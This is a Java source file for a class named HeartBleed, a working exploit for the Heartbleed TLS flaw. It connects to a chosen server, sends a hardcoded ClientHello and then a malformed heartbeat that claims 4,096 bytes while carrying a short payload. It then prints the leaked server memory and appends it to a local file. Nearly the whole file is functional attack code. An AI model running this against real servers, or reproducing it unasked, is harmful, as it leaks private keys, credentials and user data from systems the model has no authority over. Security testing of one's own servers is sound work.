package br.com.radaction.main;

import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.util.logging.Level;
import java.util.logging.Logger;

public class HeartBleed {

    private Socket connection;
    private InputStream inStr;
    private OutputStream outStr;
    private TLSmsg finalMessage;

    static byte[] clientHello = {
        0x16, 0x03, 0x02, 0x00, (byte) 0xdc, 0x01, 0x00, 0x00, (byte) 0xd8,
        0x03, 0x02, 0x53, 0x43, 0x5b, (byte) 0x90, (byte) 0x9d, (byte) 0x9b,
        0x72, 0x0b, (byte) 0xbc, 0x0c, (byte) 0xbc, 0x2b, (byte) 0x92, (byte) 0xa8,
        0x48, (byte) 0x97, (byte) 0xcf, (byte) 0xbd, 0x39, 0x04, (byte) 0xcc, 0x16,
        0x0a, (byte) 0x85, 0x03, (byte) 0x90, (byte) 0x9f, 0x77, 0x04, 0x33,
        (byte) 0xd4, (byte) 0xde, 0x00, 0x00, 0x66, (byte) 0xc0, 0x14, (byte) 0xc0,
        0x0a, (byte) 0xc0, 0x22, (byte) 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38,
        0x00, (byte) 0x88, 0x00, (byte) 0x87, (byte) 0xc0, 0x0f, (byte) 0xc0,
        0x05, 0x00, 0x35, 0x00, (byte) 0x84, (byte) 0xc0, 0x12, (byte) 0xc0,
        0x08, (byte) 0xc0, 0x1c, (byte) 0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13,
        (byte) 0xc0, 0x0d, (byte) 0xc0, 0x03, 0x00, 0x0a, (byte) 0xc0, 0x13,
        (byte) 0xc0, 0x09, (byte) 0xc0, 0x1f, (byte) 0xc0, 0x1e, 0x00, 0x33,
        0x00, 0x32, 0x00, (byte) 0x9a, 0x00, (byte) 0x99, 0x00, 0x45, 0x00,
        0x44, (byte) 0xc0, 0x0e, (byte) 0xc0, 0x04, 0x00, 0x2f, 0x00, (byte) 0x96,
        0x00, 0x41, (byte) 0xc0, 0x11, (byte) 0xc0, 0x07, (byte) 0xc0, 0x0c,
        (byte) 0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00,
        0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00,
        (byte) 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00,
        0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d,
        0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a,
        0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07, 0x00, 0x14,
        0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01,
        0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23,
        0x00, 0x00, 0x00, 0x0f, 0x00, 0x01, 0x01
    };

    public boolean connect(String server, int port) {
        boolean isConn=false;
        try {
            InetAddress ipTargeAddress = InetAddress.getByName(server);
            try {
                if (ipTargeAddress.isReachable(1000)) {
                    if (port == 0) {
                        connection = new Socket(server, 443);//443 default ssl port
                    } else {
                        connection = new Socket(server, port);
                    }
                    inStr = connection.getInputStream();
                    outStr = connection.getOutputStream();
                    isConn=true;
                }else{
                    System.out.println("Destination Host Unreachable!");
                    isConn=false;
                }
            }
            catch (IOException ex) {
                Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
                isConn=false;
            }
            
        }
        catch (UnknownHostException ex) {
            Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
            isConn=false;
        }
        return isConn;
    }

    public void hello() throws IOException {

        //send ssl/tls hello
        System.out.println("Sending hello...");
        outStr.write(clientHello);
        outStr.flush();

        while (true) {
            TLSmsg m = readPacket(inStr);
            // 22 (handshake) 0x0E (server done)
            if (m.type == 22 && m.body[0] == 0x0E) {
                System.out.println("Hello recieved!");
                System.out.printf("Type: %d Version: %d Length: %d\n", m.type, m.version, m.length);
                break;
            }

        }

    }

    //sends/receives the heartbeat
    public synchronized boolean heartBeat(String message) throws IOException {
        boolean statusServer = false;
        System.out.println("Sending Heartbeat...");
        outStr.write(makeHeartBeat(message, 4096));
        outStr.flush();

        while (true) {
            finalMessage = readPacket(inStr);

            if (finalMessage.type == 24) {
                System.out.println("Heartbeat recieved!");
                System.out.printf("Type: %d Version: %d Length: %d\n", finalMessage.type, finalMessage.version, finalMessage.length);
                statusServer = true;
                break;
            }
            if (finalMessage.type == 21) {
                System.out.println("Error");
                statusServer = false;
                break;
            }
            if (finalMessage.type == 0) {
                System.out.println("No heartbeat response received, server likely not vulnerable");
                statusServer = false;
                break;
            }
        }
        return statusServer;
    }

    public void save() throws IOException {
        FileOutputStream out = new FileOutputStream("hbTest.txt", true);
        out.write(finalMessage.body);
        out.flush();
        out.close();
    }

    public void printMesstage() {
        try {
            String saida = new String(finalMessage.body, "UTF-8");
            String filtrado = saida.replaceAll("[^A-Za-z0-9()\\[\\]]", "");
            System.out.println(filtrado);
        }
        catch (UnsupportedEncodingException ex) {
            Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * Return the data string of memory server vulnerable
     *
     * @return String Message of memory
     */
    public String getMemoryMessage() {
        String outMessage;
        String outMessageFiltred = "";
        try {
            outMessage = new String(finalMessage.body, "UTF-8");
            System.out.println(outMessage);
            outMessageFiltred = outMessage.replaceAll("[^(\\p{Alnum}|\\p{Punct})]+", "");
        }
        catch (UnsupportedEncodingException ex) {
            Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
        }
        return outMessageFiltred;
    }

    /**
     * Constructs a heartbeat with custom message
     *
     * @param message String customized
     * @param claimedLen the legend claimed
     * @return the hexabyte response
     */
    private static byte[] makeHeartBeat(String message, int claimedLen) {
        // 8 = sum of tls record lengths
        int realLen = message.length();

        byte[] messageBytes = null;

        try {
            messageBytes = message.getBytes("UTF-8");
        }
        catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }

        ByteBuffer bb = ByteBuffer.allocate(8 + realLen);

        bb.put((byte) 24);
        bb.putShort((short) 770);
        bb.putShort((short) (3 + realLen));
        bb.put((byte) 1);
        bb.putShort((short) claimedLen);

        for (int i = 0; i < realLen; i++) {
            bb.put(messageBytes[i]);
        }

        return bb.array();
    }

    /*
     * Constructs a tls packet out of the raw DataInputStream
     * (For easy reading)
     */
    private static TLSmsg readPacket(InputStream in) throws IOException {
        /*ssl/tls record headers are 5 bytes in length
         *From http://pic.dhe.ibm.com/infocenter/tpfhelp/current/index.jsp?topic=%2Fcom.ibm.ztpf-ztpfdf.doc_put.cur%2Fgtps5%2Fs5rcd.html
         *0 type
         *1-2 version
         *3-4 length
         */
        byte[] header = new byte[5];
        in.read(header);

        //byte buffer handles all the nasty byte->short/int conversions
        ByteBuffer bb = ByteBuffer.wrap(header);

        int type, version, length;
        type = bb.get();//get single byte
        version = bb.getShort(); //get 2 bytes
        length = bb.getShort(); //get 2 bytes

        //reads the body of the message from the inputstream
        byte[] body = new byte[length];
        in.read(body);

        TLSmsg result = new TLSmsg(type, version, length, body);

        return result;

    }

    private static class TLSmsg {

        byte[] body;
        int type, version, length;

        public TLSmsg(int type, int version, int length, byte[] body) {
            this.type = type;
            this.version = version;
            this.length = length;
            this.body = body;
        }
    }

}
